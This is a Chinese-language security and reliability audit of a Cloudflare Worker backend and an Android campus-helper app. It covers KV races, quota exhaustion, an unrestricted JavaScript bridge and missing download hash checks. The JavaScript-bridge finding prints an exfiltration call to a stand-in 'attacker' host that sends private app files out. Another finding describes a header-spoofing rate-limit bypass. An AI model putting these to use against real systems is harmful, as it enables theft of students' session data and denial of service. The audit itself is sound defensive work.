# 服务端 + Android 审计报告

审计范围：`server/worker.js`（1911 行）、`server/pages/dist/_worker.js`（106 行）、
`android/src/com/xxmu/helper/` 下 MainActivity / Http / WebActivity / ApkProvider / CrashGuard / QrDecoder / ScanActivity、
`android/AndroidManifest.xml`。

本报告只记录**逐行读过并确认**的问题，共 28 条（严重 5 / 中等 14 / 轻微 9）。行号对应当前工作区版本。

---

## 严重

### [严重] server/worker.js:271-286 getIdx 在 KV 读空时会用空数组覆盖真实名单
- 现象：
  ```js
  const raw = await env.AUTH.get('idx');
  if (raw) { ... return a; }
  // 首次迁移：从 lic: 前缀重建
  const out = [];
  do { const r = await env.AUTH.list({ prefix: 'lic:' ... }); ... } while (cursor);
  await putIdx(env, out);   // ← 无条件覆盖写
  ```
  `env.AUTH.get('idx')` 返回 `null` 就被当成「首次迁移」。而 v1.1.0 起 `requireGrant` 默认 `false`，
  `handleGrant` 那条写 `lic:` 的路已经废弃，KV 里 `lic:` 前缀基本是空的。
- 后果：只要 `idx` 这一次读没读到（KV 跨机房最终一致、键被误删、部署换 namespace、
  或 `JSON.parse` 抛异常被 `catch` 掉后 `Array.isArray` 判假落到重建分支），
  重建结果就是 `[]`，**紧接着 `putIdx` 把真实名单永久覆盖成空**。
  管理员打开名单页看到「0 人」，且无法恢复（`lic:` 已不再写）。
  这是不可逆的数据丢失，且触发条件是「一次读失败」，不是「数据真的没了」。
- 建议：重建只能发生在**明确知道这是首次部署**时——加一个 `idx:init` 标记键，
  只有标记不存在才重建；或者读失败时直接 `return null` 让上层报错，
  绝不 `putIdx` 一个由「读失败」推导出来的空数组。区分「JSON 损坏」与「键不存在」两个分支，
  前者应该抛错而不是重建。

### [严重] server/worker.js:1212-1216 handleVersionCheck 遍历的是对象不是学号
- 现象：
  ```js
  for (const id of idx) {
    if (rev.has(id)) continue;           // 已停用的不算
    const raw = await env.AUTH.get('last:' + id);
    ...
    if (!raw) { unknown.push({ id }); continue; }
  ```
  `getIdx()` 返回的是 `[{id, at, note}]`，`id` 是对象不是字符串。于是：
  `rev.has(id)` 永远 `false`（Set 里存的是字符串）；`'last:' + id` 拼出 `'last:[object Object]'`；
  `unknown.push({ id })` 把整个对象塞进响应；`blocked.push({ id, ... })` 同理。
- 后果：① 已停用的人被算进「将被挡在门外」的名单，管理员看到的人数虚高，
  可能因此不敢开启强制淘汰；② `last:` 读的全是同一个不存在的键，
  所有人都落进 `unknown`；③ 前端拿到的 `rows[].id` 是 `{id:…}` 对象，
  渲染成 `[object Object]`，管理员无法核对具体是谁。这个接口存在的全部意义
  （「开强制淘汰前先看谁会死」）直接失效。
- 建议：`for (const e of idx) { const id = e.id; ... }`，与 `handleList`（:1059 `idx.map(e => ...)`）保持一致。

### [严重] server/worker.js:1735-1745 handleAdminFeedback 一次请求要发 200 次 KV 读
- 现象：
  ```js
  for (const it of idx.slice(0, 200)) {
    const raw = await env.AUTH.get('fb:' + it.k);
    ...
  }
  ```
- 后果：Workers 免费版**单请求子请求上限 50**。留言攒到 51 条以上，
  这个接口必定抛 `Too many subrequests`，被顶层 `catch` 兜成
  `{ok:false,msg:'服务端忙，请稍后再试'}` 500。也就是**留言板一多，管理后台就再也打不开**。
  文件自己在 :262-265 已经为 `handleList` 记录过同一个坑（「50 个学号就会爆掉」），
  这里又原样踩了一遍。同样的形状还有 `handleFeedbackList`（:1715，最多 40 读，贴着上限）
  和 `handleVersionCheck`（:1212，人数无上限）。
- 建议：把留言正文按批塞进单个 KV 文档（`fb:page:<n>`，每页 30 条），
  或者用 `Promise.all` 并发 + 硬性上限（≤40）并分页返回；超出上限时明确回
  「请翻页」而不是 500。任何「循环里 await 一次 KV」的地方都必须能算出一个上界。

### [严重] server/worker.js:817 与 :1838 /v1/activate 无需任何凭证，每次请求烧 5 次 KV 写
- 现象：
  ```js
  await env.AUTH.put('last:' + id, ..., { expirationTtl: 60 * DAY });   // :813
  await idxAdd(env, id, '');            // :817 → getIdx + putIdx = 1 读 + 1 写
  ```
  `bindDevice`（:800）还有 `getDevs` + `putDevs`（1 读 1 写）。合计一次激活 ≈ 3 读 3 写。
  路由层只有 `rlHit('act:ip:' + clientIp(req), 200, 10*60*1000)`（:1838）一道 IP 限流，
  而 `clientIp()` 在 `x-xxmu-via === PROXY_TAG` 时直接采信 `x-xxmu-ip`——
  这个 tag 是仓库里的明文常量。
- 后果：攻击者构造 `x-xxmu-via: xxmu-pages-proxy-v1` + 每次换一个 `x-xxmu-ip`，
  配随机学号 + 随机 fp，就能无上限调用 `/v1/activate`。**1000 次写/天 ÷ 3 ≈ 334 次请求**
  就能把当日 KV 写额度清零，之后开通/停用/审核图片/发公告全部 500，
  直到次日 0 点（UTC）重置。同时 `idx` 没有任何条数上限（对比 `PHOTO_CAP=600`、
  `FB_MAX=800`），垃圾学号会永久挂在 `idx` 里，让每次 `getIdx` 的 `JSON.parse`
  和 `putIdx` 的序列化越来越慢，最终顶到 KV 单值 25 MiB 上限直接写失败。
- 建议：① 给 `idx` 加硬上限（比如 3000）并在 `idxAdd` 里淘汰最老的非管理员项；
  ② 激活只对「`requireGrant` 命中」或「管理员」写 `idx`，普通学生走「进过一次就记一笔」
  可以改成只在 `last:` 首次出现时写（用返回值判断），别每次激活都 `putIdx`；
  ③ IP 限流之外加一道全局熔断：当日写次数（可用 `rl:` 键近似）超过阈值直接快速失败，
  优先保住管理接口可用。

### [严重] server/worker.js:1526-1541 图片索引读-改-写竞态，`ph:<k>` 变永久孤儿
- 现象：
  ```js
  const idx = await getPhotoIdx(env);
  ...
  await env.AUTH.put('ph:' + k, buf);     // :1536
  idx.unshift({ k: k, ... st: 'p' });
  await putPhotoIdx(env, idx);            // :1541 整键覆盖
  ```
  留言是同一形状（:1696 `getFbIdx` → :1698 `putFbIdx`）。
- 后果：两个请求同时上传，都读到同一份旧索引，各自 `unshift` 后各自 `put`，
  后写的把先写的**整条记录覆盖掉**。被覆盖的那张图 `ph:<k>` 已经写进 KV
  且**没有 `expirationTtl`**（:1536 只传了 `buf`），于是它永远不在索引里、
  永远不会被 `handleAdminPhotoAct` 的 `del` 删除、永远占着额度——
  学生那边看到的是「已提交，等审核」，管理员审核页里根本没有这张图，
  两人互相等待。KV 没有事务，这个窗口在几百人同时用的时候必然命中。
- 建议：改成「一图一键」而不是「整表一个键」：`ph:` 实体已经是分离的，
  索引可以改成 `ph:idx:<时间倒序分片键>`（比如按天），或至少给索引写加乐观锁
  （写前重读比对 `at` 版本号，不一致就重试 3 次）。同时给 `ph:<k>` 加
  `expirationTtl`（比如 90 天）作为孤儿的兜底回收。

---

## 中等

### [中等] server/worker.js:1086 handleState 在 try 外面 JSON.parse
- 现象：`at: lic ? (JSON.parse(lic).at || 0) : 0,`
- 后果：同一段代码上方的 `last` 用 `try { JSON.parse(...) } catch` 保护了（:1082），
  这里没有。任何一个 `lic:<id>` 值是脏数据（历史版本写入、手工改过、被截断），
  整个 `/v1/admin/state` 就 500，而它是「名单页点详情」的唯一接口——
  一个坏学号能让整页详情打不开。
- 建议：直接复用 `getDevs` 那种写法：`let licObj = null; try { licObj = JSON.parse(lic) } catch(e){}`，
  然后 `at: licObj ? (licObj.at || 0) : 0`。

### [中等] server/worker.js:1077-1080 handleState 每个学号 4 次 KV 读且 ids 无上限
- 现象：`for (const id of ids) { const lic = await ...; const rev = await ...; const devs = await getDevs(...); ... JSON.parse(await ...) }`
- 后果：`idList()`（:928）只按正则过滤，不限制条数。传 20 个学号 = 80 次子请求，
  超过免费版 50 上限 → 500。管理员在名单页多选几个「查详情」就会失败，
  而且失败信息是「服务端忙」，看不出是自己传太多。
- 建议：`ids` 硬截断到 `slice(0, 10)` 并在响应里回 `truncated: true`；
  能一次 `list({prefix:'dev:'})` 拿到的别逐个人读。

### [中等] server/worker.js:914-919 handleAdmins 把 audit 写进了 for 循环
- 现象：
  ```js
  for (const id of ids) {
    if (act === 'add') await env.AUTH.put('adm:' + id, '1');
    else if (act === 'del') await env.AUTH.delete('adm:' + id);
    else return bad('act 只能是 add / del / list');
    await audit(env, 'admin_' + act, ids, '');   // ← 在循环里
  }
  ```
- 后果：加 5 个管理员 → 5 条内容完全相同（都带整个 `ids` 数组）的审计记录，
  每条还各是一次「读 audit + 写 audit」（2 次 KV 写）。日志被自己的重复项挤爆
  （`AUDIT_MAX=200`），真正有用的历史被冲掉，同时白白消耗写额度。
- 建议：把 `await audit(...)` 移到 `for` 外面，与 `handleGrant`（:946 在循环外）保持一致。

### [中等] server/worker.js:940-943 handleGrant 每个学号单独 idxAdd，且刷新了别人的 at
- 现象：`for (const id of ids) { ... await idxAdd(env, id, ...) }`，而 `idxAdd`（:290）内部是
  `getIdx` + `putIdx`。
- 后果：n 个学号 = 2n 次 KV 操作、n 次整表读写；且因为 ③ 的竞态，
  并发/连点两次「开通」时后一次会把前一次的 idx 修改整体覆盖。
  另外 `idxAdd` 对已存在的项会 `idx[i].at = now()`，把老成员的开卡时间刷成今天，
  「回溯谁是什么时候开通的」这条信息就此丢失（`note` 也会被空串以外的值覆盖）。
- 建议：一次 `getIdx` → 循环改内存 → 一次 `putIdx`，并让 `idxAdd` 只在新增时写 `at`，
  已存在时只更新 `note`（或者干脆不动）——这与 `handleAdmins` 的 loop 内 audit 是同一个反模式。

### [中等] server/worker.js:1117-1126 audit 自己也是读-改-写整键
- 现象：`const raw = await env.AUTH.get('audit'); ... arr.unshift(...); await env.AUTH.put('audit', JSON.stringify(arr));`
- 后果：两次管理动作并发（或管理员连点两次按钮）时，后写覆盖先写，
  其中一条日志永久消失。审计日志恰恰是「出事后唯一能回溯的东西」，
  而它最容易被这种吞掉：`catch (e) { /* 留痕失败不能阻断业务 */ }` 连失败都不报。
- 建议：日志改成 append-only 的键（`audit:<ts>:<rand>` 每次一个新键，读时 `list` 前缀取前 200），
  这样写入天然无竞态，也不需要读-改-写。

### [中等] server/worker.js:1435-1437 / :1536 putPhotoIdx 截断但不删被挤掉的实体
- 现象：`await env.AUTH.put(PHOTO_IDX, JSON.stringify(list.slice(0, PHOTO_CAP)));`
  而 `ph:<k>`（:1536）写的时候**没有 `expirationTtl`**。
- 后果：索引满 600 后，第 601 张图 `unshift` 进列表 → `slice(0,600)` 把最老的一条
  从索引里挤掉 → 那条 `ph:<k>` 仍在 KV 里，永远不会再被引用、不会被 `del` 删到。
  图库长期使用后 KV 里堆积大量不可见垃圾，读额度与存储一起被吃。
- 建议：`putPhotoIdx` 改为返回被挤掉的 `k` 列表，调用方 `AUTH.delete('ph:' + k)` 逐个删；
  同时给 `ph:<k>` 统一加 `expirationTtl`（如 180 天）作为二次兜底。
  留言侧（:1648 `putFbIdx`）因为 `fb:<k>` 有 `180 * DAY` 的 TTL，不构成问题。

### [中等] server/worker.js:567 handleUploadApk 的 arrayBuffer 没有 catch
- 现象：`const buf = await req.arrayBuffer();`（同文件 `readJson`（:1366）和
  `handlePhotoUpload`（:1516）都写了 `.catch(() => null)`，只有这里没有）
- 后果：客户端上传中断、或请求体读失败时直接抛异常 → 被顶层 catch 兜成
  `{ok:false,msg:'服务端忙，请稍后再试'}` 500。管理员在弱网上传 24 MB 安装包，
  失败时看到的是「服务端忙」而不是「上传中断」，会以为是服务器问题反复重试，
  每次再烧一次写额度。
- 建议：`const buf = await req.arrayBuffer().catch(() => null); if (!buf) return bad('上传被中断，请重试');`

### [中等] server/worker.js:358-368 getCfg 把「读失败」和「没配置」当成同一件事，还缓存 60 秒
- 现象：
  ```js
  const raw = await env.AUTH.get('cfg');
  let out = DEFAULT_CFG;
  if (raw) { try { out = Object.assign({}, DEFAULT_CFG, JSON.parse(raw)); } catch (e) { out = DEFAULT_CFG; } }
  CFG_CACHE = out; CFG_AT = t;
  ```
- 后果：KV 瞬时读空（或 `JSON.parse` 失败）时，`out` 落成 `DEFAULT_CFG`——公告消失、
  `latest.url` 变空串、`latest.version` 退回 `0.9.0`、`qq` 退回硬编码值——
  而且这份错误配置被**缓存整整 60 秒**，并通过 `handleConfig` 的 `edgeCache(60)`
  再放大一层。学生看到的是「公告突然没了、更新按钮点不动」，60 秒后又自己好了。
  这与 ①「getIdx 读空当首次迁移」是同一类错误的另一处。
- 建议：读失败（`raw === null` 且 `CFG_EVER_LOADED` 为真）时抛错让上层回 500 并**不写缓存**；
  只有 `JSON.parse` 失败才回落 `DEFAULT_CFG`，且回落时不更新 `CFG_AT`（下次立刻重读）。

### [中等] server/worker.js:1285/1331-1349 限流表是 isolate 内存 Map，多 isolate 下形同虚设
- 现象：`const RL = new Map();` + `rlHit()` 只读写这个 Map。
- 后果：Workers 按请求把流量分给多个 isolate（且随时回收），每个 isolate 各有一张空表。
  「10 分钟 3 张图」「一天 5 条留言」实际放大成 `3 × isolate 数`，而攻击者只要并发开连接
  就必然落到不同 isolate 上，等于限流不存在。文件注释里对 DDoS 的自知之明是对的，
  但「fp 限流是真正兜底」（:1303 的注释）这句因此不成立。
- 建议：需要真正生效的额度必须落到 KV 或 Durable Object 上（KV 写又贵，所以更适合
  Durable Object 的原子计数器）；如果坚持内存表，请把注释里的
  「真正兜底的是 fp 限流」改掉，别让下一个人以为这道防线存在。

### [中等] android/src/com/xxmu/helper/MainActivity.java:211-253 Host.httpGet/httpPost/httpFetch 是任意 URL 代理，且自动带上教务 Cookie
- 现象：
  ```java
  public String httpGet(String url) { return Http.request(url, null, cookies(), null, KB_REFERER); }
  ```
  同名同构的还有 `httpPost`（:223）与 `httpFetch`（:241）、以及异步版
  `httpFetchAsync`（:1393）/`httpFetchCkAsync`（:1441），全部通过
  `web.addJavascriptInterface(new Host(), "Host")`（:1669）暴露给
  `file:///android_asset/index.html` 里的脚本。没有任何域名白名单。
- 后果：页面脚本（或注入进页面的任何东西——WIKI/留言板渲染的富文本、
  第三方接口返回的内容）可以让 App 把 `qgjw.xxmu.edu.cn` 的完整 Cookie
  发到任意第三方主机，也可以借这台手机当内网探测跳板（`httpGetPlain('http://192.168.x.x:port')`）。
  配合 :1650 `s.setAllowFileAccess(true)`、:1665 `new WebViewClient()`（无 URL 白名单），
  这个桥的能力远大于「同步课表」所需。
- 建议：`httpGet`/`httpPost` 增加 host 白名单（`qgjw.xxmu.edu.cn`、`userapi.qiekj.com` 等
  固定几个），不在白名单直接返回 `ERR:HostNotAllowed`；`cookies()` 不要在通用代理里自动附加，
  改成显式参数 `httpGetWithCookie(url, host)`，且 host 必须等于 cookie 的来源域。
  `httpFetch` 的自定义 headers 也要禁掉 `Cookie`/`X-Admin-Key` 这类敏感头。

### [中等] android/src/com/xxmu/helper/MainActivity.java:1272-1320 handleImageResult 在 UI 线程整图解码
- 现象：`src = android.graphics.BitmapFactory.decodeStream(in);`（无 `inSampleSize`、无尺寸上限），
  紧接着 `QrDecoder.decodeBitmap(src)` 里 `int[] px = new int[w * h]`。
- 后果：一张 4000×3000 的相册照片 = 48 MB 的 Bitmap + QrDecoder 里 48 MB 的 `int[]`
  + `brightBox()` 再拷贝一份，全部在 **UI 线程**上同步跑（`onActivityResult` 直接调）。
  低端机必 OOM 或 ANR。对照：同一文件里的 `handlePhotoResult`（:1071）已经把解码
  搬到了 `"xxmu-photo"` 后台线程并加了 `inSampleSize` 采样，两条路径的标准不一致。
- 建议：`handleImageResult` 也丢到后台线程；解码前先 `inJustDecodeBounds` 读尺寸，
  长边压到 2000~2400 再解（二维码识别不需要原图，QrDecoder 自己会做多尺度切块）；
  `in.close()` 放进 `try (InputStream in = ...)`。

### [中等] android/src/com/xxmu/helper/MainActivity.java:682-689 Host.uploadApk 接受任意 filePath 和管理口令
- 现象：
  ```java
  public void uploadApk(final String key, final String uploadUrl, final String adminKey, final String filePath) {
      ... out = Http.uploadFile(uploadUrl, new File(filePath), adminKey);
  ```
  `filePath` 来自 JS（正常流程是 `handleApkResult` 回传的 `picked.apk` 绝对路径），
  没有任何「必须位于 `getCacheDir()/upd` 之下」的校验。
- 后果：页面脚本可以 `Host.uploadApk('k', 'https://attacker/', '', '/data/data/com.xxmu.helper/shared_prefs/xxmu.xml')`
  把 App 私有目录里的任意文件（含登录态、`xxmu_fp`、缓存课表）外传。
  `adminKey` 由 JS 传入也意味着口令在 WebView 的 JS 上下文里存在过，
  任何能执行 JS 的东西都能拿到它。
- 建议：服务端侧本来就是 `x-admin-key` 校验，客户端这里不必再当传递者——
  让 JS 只传 `key` 和参数，URL/口令由 Java 侧用固定常量拼；`filePath` 必须
  `new File(filePath).getCanonicalPath().startsWith(new File(getCacheDir(), ApkProvider.DIR).getCanonicalPath() + File.separator)`
  再放行（这个校验 `ApkProvider.fileFor` 已经写过一遍，可以直接复用）。

### [中等] android/src/com/xxmu/helper/Http.java:307-392 分段下载完全没有 sha256 校验
- 现象：`downloadToFile` 只 `probeLength` 拿总长，然后 4 段并发写
  `RandomAccessFile`，`return total;`。文件自己在 :299-300 写着：
  「**分段的正确性依赖 sha256 校验**——调用方必须校验总长和哈希，否则半截包会被当成好包装进系统。」
  而唯一调用方 `MainActivity.java:781` 只做了 `ok = out.length() > 1024;`。
  服务端其实给了 `x-apk-sha256`（`server/worker.js:649`），客户端从头到尾没读过这个头。
- 后果：分段写盘用 `raf.setLength(total)` 预分配，中间某段静默少写（`fetchRange` 的
  读循环遇到 `in.read` 返回 -1 就正常返回，靠上层比较 `cursor[seg] > segTo[seg]` 才重试；
  但重试 3 次仍失败时 `err` 只 `compareAndSet` 一次，先失败的段可能被后来的成功覆盖）
  时，文件长度是对的、内容有洞，`length() > 1024` 判成功 → 直接 `startInstall`。
  用户看到「下载完成」然后安装器报「解析包错误」，没有任何线索。
- 建议：`probeLength` 时顺手读 `x-apk-sha256` 存下来，下载结束后对文件算 SHA-256 比对，
  不一致就删文件并抛异常（上层已经有「失败就删掉空洞文件」的逻辑，:789）。

### [中等] server/pages/dist/_worker.js:70-72 读请求体在 try 之外，失败时返回非 JSON 的 500
- 现象：
  ```js
  if (request.method !== 'GET' && request.method !== 'HEAD') {
    init.body = await request.arrayBuffer();   // ← 不在 try 里
  }
  let r;
  try { r = await fetch(target, init); } catch (e) { ... 502 JSON ... }
  ```
- 后果：读体失败（客户端上传中断、超 24 MB 被边缘截断）时抛未捕获异常，
  Pages 返回平台默认的 500 HTML 页面。客户端 `MainActivity.java:1169` 的
  `body.startsWith("20")` 判假 → 走 `new JSONObject(body)` → 抛 → 把一整页 HTML
  （或空串 → 「网络不通」）当成错误消息。管理员上传安装包失败时会看到
  「上传失败：网络不通或服务器没响应」，而真实原因是体积超限。
- 建议：把 `arrayBuffer()` 也包进 try，失败回
  `502 {ok:false,msg:'请求体读取失败，可能是文件太大或上传中断'}`。

---

## 轻微

### [轻微] server/worker.js:1150-1154 handleSetCfg 前端整体回传 cfg 时改公告不刷新 noticeAt
- 现象：`if (b.noticeAt !== undefined) { noticeAt = parseInt(b.noticeAt, 10) || 0; }`
  优先于 `else if (newNotice !== cur.notice ...)`。
- 后果：管理前端如果把 `GET /v1/config` 的整个对象回写（`POST /v1/admin/config {…cfg, notice:'新公告'}`），
  `noticeAt` 会沿用旧值，`notice` 变了但时间戳没变，客户端「我看过这一版」的判断依旧成立，
  学生**永远看不到这条新公告**，而管理员界面显示「保存成功」。
- 建议：以「正文是否变化」为唯一依据，`b.noticeAt` 只允许显式的 `0`（清空）这一个特殊值，
  其余一律由服务端计算。

### [轻微] server/worker.js:1163 maxDev 的 `parseInt(...) || cur.maxDev` 无法设 0，NaN 静默回退
- 现象：`maxDev: b.maxDev === undefined ? cur.maxDev : (parseInt(b.maxDev, 10) || cur.maxDev),`
- 后果：管理员想「临时把所有人锁成 0 台设备」做不到（`0 || cur` 回退成原值），
  而且界面会显示保存成功。传 `"abc"` 同样静默回退，没有任何提示。
- 建议：`const n = parseInt(b.maxDev, 10); if (!isFinite(n) || n < 0) return bad('设备上限必须是 ≥0 的整数');`，
  再由 `maxDev()`（:217）负责兜 `n < 1 → MAX_DEV`。注意 `maxDev()` 当前把 0 也当成非法，
  两处要一起改才不会互相打架。

### [轻微] server/worker.js:1724 公开留言板泄露学号后 4 位
- 现象：`from: r.id ? ('同学' + String(r.id).slice(-4)) : '匿名',`
- 后果：注释写的是「公开墙上不显示学号，只显示『同学』」，实际拼了学号后 4 位。
  同一学院同年级的学号前缀相同，后 4 位是流水号，配合「谁在哪天提了什么」
  在小范围内具备可识别性（尤其留言里常带宿舍号、班级）。
- 建议：要么固定 `'同学'`（同一人多条留言也不需要区分），要么用
  `'同学' + 短哈希(r.id + 盐).slice(0,3)` 保证同一人一致但不可反推。

### [轻微] server/worker.js:1890-1901 /v1/_diag 公开暴露反代与限流自检信息
- 现象：无需鉴权返回 `viaProxy` / `ipForwarded` / `ipLooksInternal`。
- 后果：本身不含 IP 原文，但 `ipLooksInternal` 直接告诉扫描者「你们的 IP 透传现在失效了」——
  正好是构造 ④ 那种绕过时最想知道的信号。属于给攻击者做免费 A/B 测试。
- 建议：要么并进 `/v1/admin/*`，要么把 `ipLooksInternal` 去掉只留 `ok:true,ver`。

### [轻微] android/src/com/xxmu/helper/MainActivity.java:80-102 readFileIfBig / writeFile 没有 finally
- 现象：
  ```java
  FileInputStream in = new FileInputStream(f);
  String s = readAll(in);
  in.close();
  ```
  `writeFile`（:92-102）同构。
- 后果：`readAll`/`write` 抛异常（磁盘满、文件被并发删除、OOM）时流不关，
  `catch (Exception e) { return ""; }` 把它变成一个空串——上层分不清
  「没有外部课表」和「读失败」，会直接用缓存覆盖掉用户的课表
  （`externalSchedule()` 空串 = 没有，见 :108-122 的语义）。
- 建议：改 `try (FileInputStream in = new FileInputStream(f)) { ... }`；
  并且把「读失败」与「没有文件」区分开——读失败应该让调用方保留现有数据而不是清空。

### [轻微] android/src/com/xxmu/helper/MainActivity.java:1281 与 :990-998 流只在成功路径关闭
- 现象：`if (in != null) in.close();`（:1281，`decodeStream` 抛 OOM 就跳过）；
  `fo.close(); in.close();`（:997-998，`while` 循环里抛异常就跳过）。
- 后果：`handleImageResult` 解大图 OOM 是**常态**（见上面的中等条目），
  每次 OOM 泄漏一个 fd；`System.gc()` 不会回收 fd，累积到
  `Too many open files` 之后整个 App 的网络与文件功能一起失效。
  `Http.java` 的 `readResponse` 在 :542-558 已经修成了 finally 写法，这两处是漏网的。
- 建议：统一改 try-with-resources。`handleApkResult` 的 `fo`/`in`、`handleImageResult` 的 `in`、
  `readAsset`（:286-288）、`readFileIfBig`/`writeFile` 全部照改。

### [轻微] android/src/com/xxmu/helper/MainActivity.java:1606 AlertDialog 不检查 Activity 是否已销毁
- 现象：`new AlertDialog.Builder(MainActivity.this) ... .show();`
- 后果：`onJsPrompt` 在页面异步回调里触发，此时 Activity 可能已经 `finish()`，
  `show()` 抛 `WindowManager$BadTokenException` 被外层 `catch (Throwable)` 兜住 →
  `result.cancel()`。表现为「点『+ 补一条』，什么都没发生」——
  正是这段代码注释里（:1583-1588）想修的那个症状，换了个原因又回来了。
- 建议：`show()` 前加 `if (isFinishing() || (Build.VERSION.SDK_INT >= 17 && isDestroyed())) { result.cancel(); return true; }`。

### [轻微] android/src/com/xxmu/helper/Http.java:198-205 / :249-256 uploadFile / uploadRaw 的 OutputStream 只在成功路径关闭
- 现象：`os.flush(); os.close(); in.close();` 之后才 `return readResponse(c);`，
  异常路径只有 `finally` 里的 `in.close()` 和 `c.disconnect()`。
- 后果：`HttpURLConnection.disconnect()` 在未写完请求体时只是把连接标记为可复用/丢弃，
  不保证关闭底层 socket 的写端。弱网下上传失败（很常见：120 秒读超时、
  连接被切）会留下半开连接，多次重试后 fd 泄漏。
- 建议：`os` 也纳入 `finally`（或 try-with-resources），并注意顺序
  （先 `os.close()` 再 `readResponse`，不能颠倒，否则会提前结束请求体）。

### [轻微] android/AndroidManifest.xml:25 usesCleartextTraffic="true" 全局放开明文
- 现象：`android:usesCleartextTraffic="true"`
- 后果：所有 `http://` 都能走——包括第三方接口（`userapi.qiekj.com` 之外任何被
  配置进来的地址）与教务链路的任何一次降级。校园网里做一次 ARP/DNS 劫持就能
  拿到明文请求体（登录表单、Cookie）。同时 `WebActivity.java:291`
  `setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW)` 让内嵌 WebView 也允许
  https 页面加载 http 资源，两个宽松设置叠加。
- 建议：全局改成 `false`，需要的域用 `network_security_config.xml` 按域白名单
  （`qgjw.xxmu.edu.cn` 若确实只有 http，就只给它开 cleartext）；
  `WebActivity` 的 mixed content 改 `MIXED_CONTENT_COMPATIBILITY_MODE`。

---

## 我检查过但认为没问题的点

- **`x-admin-key` 已做定长比较**：`server/worker.js:890-896` 的 `constEq()` 先比长度再逐字节 XOR，
  `isAdmin`（:898-901）用它；`handleActivate` 的管理员口令分支（:751）仍是 `ak !== want`，
  但它是先比长度再比内容、且错误响应不区分「长度不对」与「内容不对」，
  在这个场景下不构成可利用的时间侧信道（且 `/v1/activate` 受 IP 限流）。**不作为问题上报。**
- **`bad()` 已经带 `cache-control: no-store`**（:60-66），401/429 不会被边缘缓存转发给别人。
- **`rlHit` 的 `RL.clear()` 已改掉**（:1333-1345 改为先清过期、再按插入顺序淘汰最老的），
  不会被「撑满表」换到全新配额。
- **`/v1/photo` 已加 `req.method === 'GET'` 判断**（:1828），POST 上传不会再被取图路由截走；
  `/v1/feedback` 的 GET/POST 也已分开（:1829/:1832）。
- **`handlePhoto` 的审核状态检查确实在 `edgeCache` 的 producer 里面**（:1474-1477），
  缓存命中时不碰 KV；`handleAdminPhotoAct` 每次动作都 `purgeEdge` 两条路径（:1601-1602），
  不会留下已下架的旧图。
- **`edgeCache` 的 key 不含 Cookie/头**（:98 `u.origin + u.pathname + u.search`）：
  它只用于 `/v1/config`、`/v1/photos`、`/v1/photo`、`/v1/feedback` 四个
  响应与用户无关的 GET，不会串用户内容。`purgeEdge`（:531-538）用的是同一个拼法，
  清理与写入的 key 一致。**但注意**：`handlePhotoUpload` 的 `?fp=` 只出现在 POST 里，
  不进缓存键，这一点是对的。
- **`getApkMeta` 故意不做内存缓存**（:439-454）：为避免钉住旧 sha 导致持续发老包，
  代价是每次 1 次小 KV 读，取舍合理。`getApkBlob` 用 `sha256|size|name|at` 做指纹（:476），
  历史上缺 `sha256` 的包也能命中。
- **`ApkProvider.java` 没有路径穿越**：`fileFor`（:46-61）先拒 `..` / `/` / `\`，
  再做 `getCanonicalPath().startsWith(dir.getCanonicalPath() + File.separator)` 二次校验，
  最后 `f.isFile() ? f : null`；`openFile` 强制 `MODE_READ_ONLY`；`uriFor` 只取 `getName()` 单段。
- **`scan`/QR 之外的 `ScanActivity.java` 没有明显泄漏**：`onPause` → `release()`，
  `onDestroy` → `release()` + `pool.shutdownNow()` + `ui.removeCallbacksAndMessages(null)`；
  预览回调里 `decoding.compareAndSet(false, true)` 保证同一时刻只有一个解码任务，
  `finally` 里复位。相机帧回调不会在 release 之后继续跑。
- **`CrashGuard.java` 的 IO 全部正确关闭**：`write`（:60-68）与 `read`（:78-90）都用了
  `try/finally`，且 `install` 用 `installed` 幂等、`write` 外层再包一层 `catch (Throwable)` 防二次崩溃。
- **`WebActivity.java` 的 poller 正确清理**：`onDestroy`（:490-506）
  `poller.removeCallbacks(pollTask)` + `web.destroy()`，`finishedOk` 保证 `setResult` 幂等。
- **`MainActivity.onDestroy` 已经补齐**（:1726-1745）：`removeJavascriptInterface("Host")` →
  `stopLoading()` → `loadUrl("about:blank")` → `destroy()` → `HTTP_POOL.clear()` → `web = null`，
  所有 `notifyXxx` 都有 `if (web != null)` 保护，不会向已销毁的 WebView 调 `evaluateJavascript`。
- **`Http.readResponse` 的关流已进 finally**（:542-558），gzip 包在外层、关外层连带关内层；
  `downloadSingle`（:488-523）三个资源都在 finally 里。
- **`downloadToFile` 的分段进度是幂等的**：`downloaded()` 用「各段游标相对起点增量之和」（:478-485），
  重试同一段不会把字节数两遍，不会出现 >100% 的进度。
- **`handleApk` 的 Range 解析边界正确**：`bytes=-N` 取尾部、`bytes=N-` 取到结尾、
  `start > end || start >= total` → `apk416()` 并带 `content-range: bytes */total`；
  `buf.slice(start, end + 1)` 对 `ArrayBuffer` 合法（`ArrayBuffer.prototype.slice`，末端不含）。
- **`handlePhotoUpload` 的三层限额是自洽的**：`rlHit(…,3,10min)`、`pending >= 40` 拒收、
  `idx.length >= PHOTO_CAP` 拒收，且 `imageKind` 魔数校验（:1372-1381）挡掉了
  「改后缀的任意文件」。`readJson` 的 `tooBig` 先看 `content-length` 再读体（:1353-1369），
  不会把超大请求体读进内存。
- **`codeFor` / `makeTicket` / `checkTicket` 的密码学用法没问题**：
  `checkTicket`（:190-204）对 `''` 与 `'admin'` 两种 role 都做定长 XOR 比较，
  不会因为 role 不同而早退；`exp` 先判过期再算 HMAC。
- **`page` 代理删掉了 `content-length` 并重新由边缘生成**（`_worker.js:58-60`），
  不会出现「声明长度与实际 body 不符」导致的挂起。`redirect: 'manual'` + 状态透传的组合
  在当前路由下不会被触发（Worker 不返回 3xx），暂不构成问题。
